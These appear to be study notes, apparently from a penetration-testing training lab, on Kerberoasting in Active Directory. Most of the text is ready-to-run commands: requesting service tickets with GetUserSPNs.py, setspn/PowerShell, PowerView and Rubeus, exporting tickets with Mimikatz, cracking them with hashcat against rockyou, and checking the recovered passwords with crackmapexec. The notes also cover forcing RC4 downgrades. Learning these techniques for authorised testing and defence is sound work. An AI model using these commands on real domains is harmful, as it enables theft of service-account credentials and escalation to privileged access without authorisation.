## Overview
Lateral movement/ PrivEsc technique used in AD.
Targets [Service Principal names](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names). 
	Unique Identifiers that Kerberos uses to map a service instance to a service account. 
	Domain accounts of used to overcome network limitations. 
	Any account can request any Kerberos ticket.
Need a password or NTLM hash, shell in a domain user or a SYSTEM level access on a domain joined host.
Service accounts often added to privileged groups such as domain admins. 
Service accounts often give week/ reused passwords to simplify administration. 

### How the Attack Works 
#### Where
- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.
#### With 
- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.
### Encryption types
`$krb5tgs$23$*` = RC4 Hashcat mode 13100
`$krb5tgs$17$*` = AES128 Hashcat mode 19700
`$krb5tgs$18$*` = AES256

t is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`, then double-clicking on `Network security: Configure encryption types allowed for Kerberos` and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for `RC4_HMAC_MD5` would allow for the above downgrade example to occur in 2019.

## From Linux
#### GetUsersSPNs
##### Getting a Ticket
List Service Accounts
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
Requesting all TGS tickets
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```
Requesting a Single Ticket
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```
##### Saving a Ticket 
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
##### Crack the Ticket 
```shell
 hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```
##### Test the Authentication 
```shell
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```
##### Can list what groups the user is in with 
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/<user>
```
Group is after the CN= 
## From Windows 
### Semi Manual Methods
Using [setspn](<https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)>)binary
#### Enumerate SPNs 
```cmd
setspn.exe -Q */*
```
#### Target a Single User 
```powershell
Add-Type -AssemblyName System.IdentityModel
```

```powershell
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

**Notes**
	- The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
	- The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
	- [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
	- We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
	- We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session
#### Retrieving all tickets
```powershell
 setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

```
#### Extracting Tickets with Mimikatz
```cmd
base64 /out:true

kerberos::list /export 
```
Without the base64 output, you can transfer the file across any other way.
#### Prepare for cracking 
```shell
echo "<base64 blob>" |  tr -d \\n 
```
#### Place the output into a File 
```shell
 cat encoded_file | base64 -d > sqldev.kirbi
```
#### Extract the Kerberos Ticket
```shell
python2.7 kirbi2john.py sqldev.kirbi
```
#### Modify the file for Hashcat 
```shell
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
#### Crack the hash 
```shell
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

### Automated Method 
#### PowerView 
```powershell
Import-Module .\PowerView.ps1
 
Get-DomainUser * -spn | select samaccountname
```
##### Target a specific user 
```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
##### Export All tickets to a CSV File 
```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```
##### Crack the hash 
```shell
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

#### Rubeus
##### Gather stats
```powershell
.\Rubeus.exe kerberoast /stats
```
##### Request Tickets 
`Admincount=1` Likely high value targets
`nowrap` means it can easily be copied.
```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
Or
```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

#### Request a RC4 ticket if another form of encryption is used. 
use the `/tgtdeleg` flag
This will not work against Server 2019 + .
